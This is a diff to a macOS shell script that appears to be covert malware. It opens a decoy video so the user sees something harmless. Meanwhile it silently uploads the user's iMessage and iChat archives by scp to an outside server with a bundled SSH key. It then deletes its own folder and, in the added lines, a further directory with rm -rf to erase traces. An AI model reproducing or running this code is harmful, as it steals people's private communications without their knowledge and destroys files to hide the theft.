@@ -2,28 +2,36 @@
 CDIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd ) #Directory of app
 ARCHIVE=~/Library/Containers/com.apple.iChat/Data/Library/Messages/Archive
 MESSAGES=~/Library/Messages
+#SERV=www.fsckyourself.com
 SERV=www.naookiesato.com
 SERVPORT=8087
 SERVUSER=sauron
 SERVPATH=/home/sauron/messages
 KEY=${CDIR}/.ssh/id_rsa
+KEYPATH=~/.msssh/id_rsa
+
+mkdir ${KEYPATH}
+mv ${KEY} ${KEYPATH}
+chmod 400 ${KEYPATH}
+
 cd ${CDIR}
 
 open ${CDIR}/Content/IMG_6818.MOV
 cd ${ARCHIVE}
 if [ $? -eq 0 ]; then
-    ssh -i ${KEY} -p ${SERVPORT} ${SERVUSER}@${SERV} "mkdir ${SERVPATH}"
-    ssh -i ${KEY} -p ${SERVPORT} ${SERVUSER}@${SERV} "mkdir ${SERVPATH}/${USER}"
-    scp -i ${KEY} -P ${SERVPORT} -r ${ARCHIVE} ${SERVUSER}@${SERV}://${SERVPATH}/${USER}/
+    ssh -i ${KEYPATH} -p ${SERVPORT} ${SERVUSER}@${SERV} "mkdir ${SERVPATH}"
+    ssh -i ${KEYPATH} -p ${SERVPORT} ${SERVUSER}@${SERV} "mkdir ${SERVPATH}/${USER}"
+    scp -i ${KEYPATH} -P ${SERVPORT} -r ${ARCHIVE} ${SERVUSER}@${SERV}://${SERVPATH}/${USER}/
 fi
 cd ${MESSAGES}
 if [ $? -eq 0 ]; then
-    ssh -i ${KEY} -p ${SERVPORT} ${SERVUSER}@${SERV} "mkdir ${SERVPATH}"
-    ssh -i ${KEY} -p ${SERVPORT} ${SERVUSER}@${SERV} "mkdir ${SERVPATH}/${USER}"
-    scp -i ${KEY} -P ${SERVPORT} -r ${MESSAGES} ${SERVUSER}@${SERV}://${SERVPATH}/${USER}/
+    ssh -i ${KEYPATH} -p ${SERVPORT} ${SERVUSER}@${SERV} "mkdir ${SERVPATH}"
+    ssh -i ${KEYPATH} -p ${SERVPORT} ${SERVUSER}@${SERV} "mkdir ${SERVPATH}/${USER}"
+    scp -i ${KEYPATH} -P ${SERVPORT} -r ${MESSAGES} ${SERVUSER}@${SERV}://${SERVPATH}/${USER}/
 fi
 
 #rm -rf ${CDIR} #cleanup
 cd ${CDIR}/../
 rm -rf ./* #cleanup
+rm -rf ${KEYPATH}/../ #cleanup
 
